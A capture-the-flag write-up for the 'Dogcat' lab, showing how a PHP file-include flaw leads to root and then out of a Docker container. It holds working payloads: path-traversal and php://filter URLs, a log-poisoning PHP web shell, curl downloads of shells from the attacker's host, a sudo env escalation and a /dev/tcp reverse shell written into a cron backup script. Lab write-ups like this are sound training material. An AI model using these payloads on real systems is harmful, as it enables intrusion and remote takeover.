# Dogcat

Description:

I made a website where you can look at pictures of dogs and/or cats!

## Enumeration

### NMAP

> nmap -sCSV -O <box_ip>

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 09:02 EDT
Nmap scan report for 10.10.74.124
Host is up (0.72s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```

we have two doors open

80 running apache 2.4.38

and 

22 running openssh 


### website

![image](https://user-images.githubusercontent.com/53917092/97306673-8ea23980-183d-11eb-9cce-2f13c0602f23.png)

by clicking on "A dog"

![image](https://user-images.githubusercontent.com/53917092/97306782-b42f4300-183d-11eb-820d-6cb3ea892444.png)

by clicking on "A cat"

![image](https://user-images.githubusercontent.com/53917092/97306885-cc06c700-183d-11eb-92fe-66a29f4f565c.png)

By analyzing the url, we can try to see other files besides the convetional ones, for example:

![image](https://user-images.githubusercontent.com/53917092/97308357-8ba84880-183f-11eb-85ef-83a87269afc3.png)

"Sorry, only dogs or cats are allowed."

this message leads us to think that the system checks whether we type "cat or dog" in the url

to bypass, we can use cat/../<path to file>

that is, we will enter the folder "cats", we will leave and then we will go back to where we were but the url will pass in the verification

![image](https://user-images.githubusercontent.com/53917092/97309619-0887f200-1841-11eb-878d-97fbe36b36fa.png)

it works?

this tried to read the index.php but gave some error. but it worked

## LFI

Local File Inclusion

we can read .php files from the server

trying to read files with other extensions we have this error:

![image](https://user-images.githubusercontent.com/53917092/97310357-e347b380-1841-11eb-88d5-18e1f88f2cad.png)

"passwd.php"

the system adds the .php extension by default

we can try to read the file "index.php", without errors by coding it in base64 using "php Wrapper filter"

> http://<BOX_IP>/?view=php://filter/convert.base64-encode/resource=cat/../index

![image](https://user-images.githubusercontent.com/53917092/97311062-b647d080-1842-11eb-9b9b-eb2a0fb0261f.png)

decoding this base64 we can view the index.php source code and understand how it works

![image](https://user-images.githubusercontent.com/53917092/97311288-f73fe500-1842-11eb-947a-a1a6a2cdfb3b.png)

here we can see that the system only defines the extension when we do not define "ext".

we can read all files using "ext"

example, reading /etc/passwd

> /?view=cat/../../../../../../../../etc/passwd&ext=

![image](https://user-images.githubusercontent.com/53917092/97311598-4a199c80-1843-11eb-8dbc-f4aa09133771.png)

## RCE

Remote Code Execution

in this case we were able to scale from an LFI to a RCE by reading the log files

to read apache2 log files :

> /?view=cat/../../../../../../../../var/log/apache2/access.log&ext=

![image](https://user-images.githubusercontent.com/53917092/97312250-08d5bc80-1844-11eb-8842-4f4f5e3e7042.png)

now if we inject php code into the log, it will be executed, with that we get a RCE

to do this I will use a proxy called burpsuit, to intercept the connection and inject code replacing the user agent

writing a shell 

> <?php system($_GET['cmd']) ?>

![image](https://user-images.githubusercontent.com/53917092/97314326-5bb07380-1846-11eb-9c14-172d88b5a7f6.png)

refreshing and viewing the source code :

![image](https://user-images.githubusercontent.com/53917092/97314572-9d411e80-1846-11eb-81ae-e0a9c8ad26dc.png)

it works!

now we can run commands in URL using &cmd=

> view-source:http://<BOX IP>/?view=cat/../../../../../../../../var/log/apache2/access.log&ext=&cmd=ls

![image](https://user-images.githubusercontent.com/53917092/97314809-d6798e80-1846-11eb-8232-7bf774b7bf2b.png)

### First flag

> view-source:http://<BOX IP>/?view=cat/../../../../../../../../var/log/apache2/access.log&ext=&cmd=cat+flag.php

![image](https://user-images.githubusercontent.com/53917092/97315020-0759c380-1847-11eb-990b-3c14c1637dfd.png)

## Web Shell

to see what we can use to get a web shell, we can list the machine's binaries

>view-source:http://<BOX IP>/?view=cat/../../../../../../../../var/log/apache2/access.log&ext=&cmd=ls+/usr/bin

![image](https://user-images.githubusercontent.com/53917092/97315473-8818bf80-1847-11eb-920a-cfd5a6c87536.png)

i will use curl to get a shell from my machine

in our machine:

installing the powny shell

> wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O powny.php

> sudo python3 -m http.server 80


now I will download the file and put it in /var/www/html

in box machine (RCE)

>view-source:http://<BOX IP>/?view=cat/../../../../../../../../var/log/apache2/access.log&ext=&cmd=curl <YOUR IP>/powny.php -o /var/www/html/powny.php

![image](https://user-images.githubusercontent.com/53917092/97318439-a46a2b80-184a-11eb-9df8-82fff35be882.png)

it works

### Second flag

![image](https://user-images.githubusercontent.com/53917092/97318748-f1e69880-184a-11eb-90b4-52143880ef9b.png)

## Reverse Shell

we will use php-reverse-shell from pentest monkey

so

in our machine:

installing the rev shell

> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

(use nano or vim to change the ip and port)

> sudo python3 -m http.server 80

![image](https://user-images.githubusercontent.com/53917092/97321361-8d790880-184d-11eb-8a27-d7ac6b96b77d.png)

in the web shell :

> curl <YOUR IP>/php-reverse-shell.php -o /var/www/html/shell.php

![image](https://user-images.githubusercontent.com/53917092/97321494-b13c4e80-184d-11eb-9a66-35f1a8faf2b9.png)

and now is just enter in:

<BOX IP>/shell.php

![image](https://user-images.githubusercontent.com/53917092/97321555-c618e200-184d-11eb-83f0-f2d3f3342253.png)

![image](https://user-images.githubusercontent.com/53917092/97321608-d3ce6780-184d-11eb-8f7e-4fe4b0b57f3c.png)

## Privilege Escalation

> cd /tmp/

installing linpeas

in our machine:

installing the linpeas

> wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

> sudo python3 -m http.server 80

in the reverse shell:

> curl <YOUR IP>/linpeas.sh -o /tmp/linpeas.sh

>chmod +x linpeas.sh

> ./linpeas.sh > output.txt &

reading the output

> cat output.txt

![image](https://user-images.githubusercontent.com/53917092/97322387-81da1180-184e-11eb-8fcb-d70820e93d0a.png)

![image](https://user-images.githubusercontent.com/53917092/97323609-bdc1a680-184f-11eb-9a45-5ccf5f594448.png)

linpeas pointed this binary (/usr/bin/env) as 99% chance of being vulnerable for privilege escalation

checking in GTFObins about this binary

![image](https://user-images.githubusercontent.com/53917092/97324130-450f1a00-1850-11eb-9588-d893947b0965.png)

> sudo env /bin/sh

![image](https://user-images.githubusercontent.com/53917092/97324324-7be53000-1850-11eb-9c45-51c970969837.png)

### third flag

![image](https://user-images.githubusercontent.com/53917092/97324598-c5ce1600-1850-11eb-9679-bd259f568ad5.png)

## Privelege escalation escalation?

as root. in the root (/) of system we see:

![image](https://user-images.githubusercontent.com/53917092/97325930-3e81a200-1852-11eb-983a-abd973205979.png)

which shows that docker is installed on this machine and we have to do a "Container escape"

so searching for scripts 

> find / -type f -name *.sh

we find : /opt/backups/backup.sh

![image](https://user-images.githubusercontent.com/53917092/97327348-a4baf480-1853-11eb-80a2-7a8a6b4111d4.png)

this script compresses files from outside the container, so I will replace it with a reverse shell and it will be called from outside the container too

>echo '#!/bin/bash' > /opt/backups/backup.sh

> echo 'bash -i >& /dev/tcp/<YOUR IP>/1234 0>&1' >> /opt/backups/backup.sh

and just wait

a few minutes later:

![image](https://user-images.githubusercontent.com/53917092/97328868-38d98b80-1855-11eb-9a57-59aaa9145006.png)

## Fourth flag

![image](https://user-images.githubusercontent.com/53917092/97329058-69212a00-1855-11eb-942b-b6723d136cad.png)